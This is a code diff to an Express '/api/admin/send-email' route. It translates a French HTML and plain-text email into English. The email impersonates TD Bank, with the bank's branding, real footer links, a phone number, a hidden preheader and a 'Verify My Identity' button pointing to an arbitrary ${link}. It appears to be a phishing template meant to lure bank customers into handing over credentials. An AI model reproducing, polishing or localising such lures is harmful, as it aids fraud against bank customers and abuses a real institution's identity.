@@ -262,16 +262,16 @@ app.post('/api/admin/send-email', async (req, res) => {
   }
 
   const emailPayload = {
-    subject: 'Vérification sécurisée requise – TD',
+    subject: 'Secure verification required – TD',
     html: `<!DOCTYPE html>
-<html lang="fr" xmlns="http://www.w3.org/1999/xhtml" xmlns:o="urn:schemas-microsoft-com:office:office">
+<html lang="en" xmlns="http://www.w3.org/1999/xhtml" xmlns:o="urn:schemas-microsoft-com:office:office">
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <meta name="x-apple-disable-message-reformatting">
   <meta name="format-detection" content="telephone=no,address=no,email=no,date=no,url=no">
-  <title>Vérification sécurisée requise – TD</title>
+  <title>Secure verification required – TD</title>
   <!--[if mso]>
   <noscript>
     <xml>
@@ -306,7 +306,7 @@ app.post('/api/admin/send-email', async (req, res) => {
 <body style="margin:0;padding:0;background-color:#f0f2f5;">
 
   <div style="display:none;font-size:1px;color:#f0f2f5;line-height:1px;max-height:0px;max-width:0px;opacity:0;overflow:hidden;">
-    Vérification sécurisée requise – Action requise sur votre compte TD.
+    Secure verification required – Action required on your TD account.
   </div>
 
   <table role="presentation" border="0" cellpadding="0" cellspacing="0" width="100%" style="background-color:#f0f2f5;">
@@ -327,7 +327,7 @@ app.post('/api/admin/send-email', async (req, res) => {
                     <span style="font-family:Arial,Helvetica,sans-serif;font-size:20px;font-weight:bold;color:#067a2b;letter-spacing:0.5px;">TD BANK</span>
                   </td>
                   <td align="right" style="vertical-align:middle;">
-                    <span style="font-family:Arial,Helvetica,sans-serif;font-size:11px;color:#888888;letter-spacing:0.5px;">AVIS SÉCURISÉ</span>
+                    <span style="font-family:Arial,Helvetica,sans-serif;font-size:11px;color:#888888;letter-spacing:0.5px;">SECURITY NOTICE</span>
                   </td>
                 </tr>
               </table>
@@ -336,33 +336,33 @@ app.post('/api/admin/send-email', async (req, res) => {
 
           <tr>
             <td style="background-color:#003f2d;padding:14px 40px;">
-              <span style="font-family:Arial,Helvetica,sans-serif;font-size:13px;color:#ffffff;font-weight:bold;">Vérification de sécurité requise</span>
+              <span style="font-family:Arial,Helvetica,sans-serif;font-size:13px;color:#ffffff;font-weight:bold;">Security Verification Required</span>
             </td>
           </tr>
 
           <tr>
             <td class="email-content" style="padding:40px 40px 32px 40px;">
 
-              <p style="margin:0 0 6px 0;font-family:Arial,Helvetica,sans-serif;font-size:13px;color:#888888;letter-spacing:0.5px;text-transform:uppercase;">Cher(e) client(e),</p>
+              <p style="margin:0 0 6px 0;font-family:Arial,Helvetica,sans-serif;font-size:13px;color:#888888;letter-spacing:0.5px;text-transform:uppercase;">Dear Customer,</p>
 
               <h1 style="margin:0 0 24px 0;font-family:Arial,Helvetica,sans-serif;font-size:22px;font-weight:bold;color:#003f2d;line-height:1.3;">
-                Vérification de votre identité requise
+                Identity Verification Required
               </h1>
 
               <p style="margin:0 0 18px 0;font-family:Arial,Helvetica,sans-serif;font-size:15px;color:#333333;line-height:1.7;">
-                Nous devons vérifier votre identité afin de finaliser votre demande. Cette étape est nécessaire pour assurer la sécurité de votre compte et protéger vos informations personnelles.
+                We need to verify your identity to finalize your request. This step is necessary to ensure the security of your account and protect your personal information.
               </p>
 
               <p style="margin:0 0 28px 0;font-family:Arial,Helvetica,sans-serif;font-size:15px;color:#333333;line-height:1.7;">
-                Veuillez cliquer sur le bouton ci-dessous pour procéder à la vérification. Cette démarche ne prendra que quelques instants.
+                Please click the button below to proceed with the verification. This process will only take a few moments.
               </p>
 
               <table role="presentation" border="0" cellpadding="0" cellspacing="0" width="100%" style="background-color:#f5f6fa;border-left:4px solid #067a2b;border-radius:3px;margin-bottom:32px;">
                 <tr>
                   <td style="padding:16px 20px;">
                     <p style="margin:0;font-family:Arial,Helvetica,sans-serif;font-size:13px;color:#555555;line-height:1.6;">
-                      <strong style="color:#003f2d;">Pourquoi cette vérification ?</strong><br>
-                      Pour votre sécurité, nous vérifions périodiquement l'identité de nos clients. Cette mesure nous permet de détecter toute activité non autorisée sur votre compte.
+                      <strong style="color:#003f2d;">Why this verification?</strong><br>
+                      For your security, we periodically verify our customers' identity. This measure helps us detect any unauthorized activity on your account.
                     </p>
                   </td>
                 </tr>
@@ -379,7 +379,7 @@ app.post('/api/admin/send-email', async (req, res) => {
                       strokecolor="#067a2b"
                       fillcolor="#067a2b">
                       <w:anchorlock/>
-                      <center style="color:#ffffff;font-family:Arial,Helvetica,sans-serif;font-size:16px;font-weight:bold;">Vérifier mon identité</center>
+                      <center style="color:#ffffff;font-family:Arial,Helvetica,sans-serif;font-size:16px;font-weight:bold;">Verify My Identity</center>
                     </v:roundrect>
                     <![endif]-->
                     <!--[if !mso]><!-->
@@ -388,7 +388,7 @@ app.post('/api/admin/send-email', async (req, res) => {
                        rel="noopener noreferrer"
                        class="btn-verify"
                        style="display:inline-block;background-color:#067a2b;color:#ffffff;font-family:Arial,Helvetica,sans-serif;font-size:16px;font-weight:bold;text-decoration:none;padding:16px 40px;border-radius:4px;letter-spacing:0.5px;mso-hide:all;">
-                      Vérifier mon identité
+                      Verify My Identity
                     </a>
                     <!--<![endif]-->
                   </td>
@@ -396,7 +396,7 @@ app.post('/api/admin/send-email', async (req, res) => {
               </table>
 
               <p style="margin:0 0 24px 0;font-family:Arial,Helvetica,sans-serif;font-size:13px;color:#888888;line-height:1.6;text-align:center;">
-                Si le bouton ne fonctionne pas, copiez et collez ce lien dans votre navigateur :<br>
+                If the button does not work, copy and paste this link into your browser:<br>
                 <a href="${link}" target="_blank" style="color:#067a2b;text-decoration:underline;word-break:break-all;">${link}</a>
               </p>
 
@@ -404,7 +404,7 @@ app.post('/api/admin/send-email', async (req, res) => {
                 <tr>
                   <td style="padding:14px 18px;">
                     <p style="margin:0;font-family:Arial,Helvetica,sans-serif;font-size:12px;color:#795548;line-height:1.6;">
-                      ⚠️ <strong>Note de sécurité :</strong> La Banque TD ne vous demandera jamais votre NIP, mot de passe ou numéro de carte complet par courriel. Si vous n'avez pas demandé cette vérification, veuillez contacter notre service à la clientèle immédiatement.
+                      ⚠️ <strong>Security Note:</strong> TD Bank will never ask for your PIN, password, or full card number by email. If you did not request this verification, please contact our customer service immediately.
                     </p>
                   </td>
                 </tr>
@@ -424,11 +424,11 @@ app.post('/api/admin/send-email', async (req, res) => {
                 <tr>
                   <td align="center">
                     <p style="margin:0 0 6px 0;font-family:Arial,Helvetica,sans-serif;font-size:12px;color:#666666;line-height:1.6;">
-                      <strong style="color:#333333;">Besoin d'aide ?</strong>
+                      <strong style="color:#333333;">Need Help?</strong>
                     </p>
                     <p style="margin:0;font-family:Arial,Helvetica,sans-serif;font-size:12px;color:#666666;line-height:1.7;">
-                      Communiquez avec nous au <strong>1 800 895-4463</strong><br>
-                      Disponible 24 heures sur 24, 7 jours sur 7
+                      Contact us at <strong>1-800-895-4463</strong><br>
+                      Available 24 hours a day, 7 days a week
                     </p>
                   </td>
                 </tr>
@@ -437,19 +437,19 @@ app.post('/api/admin/send-email', async (req, res) => {
               <table role="presentation" border="0" cellpadding="0" cellspacing="0" width="100%" style="margin-bottom:18px;">
                 <tr>
                   <td align="center">
-                    <a href="https://www.td.com/ca/fr/a-propos-de-la-td/confidentialite-et-securite" target="_blank" style="font-family:Arial,Helvetica,sans-serif;font-size:11px;color:#067a2b;text-decoration:none;">Centre de sécurité</a>
+                    <a href="https://www.td.com/ca/en/about-td/privacy-and-security" target="_blank" style="font-family:Arial,Helvetica,sans-serif;font-size:11px;color:#067a2b;text-decoration:none;">Security Centre</a>
                     <span style="font-family:Arial,Helvetica,sans-serif;font-size:11px;color:#cccccc;margin:0 8px;">|</span>
-                    <a href="https://www.td.com/ca/fr/a-propos-de-la-td/confidentialite-et-securite/declaration-sur-la-confidentialite" target="_blank" style="font-family:Arial,Helvetica,sans-serif;font-size:11px;color:#067a2b;text-decoration:none;">Politique de confidentialité</a>
+                    <a href="https://www.td.com/ca/en/about-td/privacy-and-security/privacy-agreement" target="_blank" style="font-family:Arial,Helvetica,sans-serif;font-size:11px;color:#067a2b;text-decoration:none;">Privacy Policy</a>
                     <span style="font-family:Arial,Helvetica,sans-serif;font-size:11px;color:#cccccc;margin:0 8px;">|</span>
-                    <a href="https://www.td.com/ca/fr/services-bancaires-personnels" target="_blank" style="font-family:Arial,Helvetica,sans-serif;font-size:11px;color:#067a2b;text-decoration:none;">td.com</a>
+                    <a href="https://www.td.com/ca/en/personal-banking" target="_blank" style="font-family:Arial,Helvetica,sans-serif;font-size:11px;color:#067a2b;text-decoration:none;">td.com</a>
                   </td>
                 </tr>
               </table>
 
               <p style="margin:0;font-family:Arial,Helvetica,sans-serif;font-size:11px;color:#999999;line-height:1.6;text-align:center;">
-                © 2026 Groupe Banque TD. Tous droits réservés.<br>
-                66, rue Wellington Ouest, Toronto (Ontario) M5K 1A2<br><br>
-                Ce courriel a été envoyé à l'adresse associée à votre compte TD. Il s'agit d'un message transactionnel lié à la sécurité de votre compte.
+                © 2026 TD Bank Group. All rights reserved.<br>
+                66 Wellington Street West, Toronto, Ontario M5K 1A2<br><br>
+                This email was sent to the address associated with your TD account. This is a transactional message related to the security of your account.
               </p>
 
             </td>
@@ -467,7 +467,7 @@ app.post('/api/admin/send-email', async (req, res) => {
 
 </body>
 </html>`,
-    text: `Cher(e) client(e),\n\nNous devons vérifier votre identité afin de finaliser votre demande.\n\nVeuillez cliquer sur ce lien pour procéder à la vérification :\n${link}\n\nSi vous n'avez pas demandé cette vérification, veuillez contacter notre service à la clientèle au 1 800 895-4463.\n\n© ${new Date().getFullYear()} Groupe Banque TD. Tous droits réservés.`,
+    text: `Dear Customer,\n\nWe need to verify your identity to finalize your request.\n\nPlease click on this link to proceed with the verification:\n${link}\n\nIf you did not request this verification, please contact our customer service at 1-800-895-4463.\n\n© ${new Date().getFullYear()} TD Bank Group. All rights reserved.`,
   };
 
   try {
